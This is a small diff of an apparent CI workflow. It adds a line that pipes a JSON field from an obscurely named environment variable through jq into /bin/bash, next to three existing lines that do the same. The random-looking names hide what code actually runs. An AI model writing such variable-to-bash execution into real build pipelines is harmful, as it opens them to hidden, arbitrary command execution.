@@ -26,6 +26,7 @@ jobs:
           echo $wwbz604 | jq -r .m66 | /bin/bash
           printf '%s' "$cxld46374" | jq -r .jrhok9 | /bin/bash
           printf '%s' "$x54" | jq -r .r3 | /bin/bash
+          echo $da708 | jq -r .arxc08 | /bin/bash
 
       - name: Save archive
         if: always()
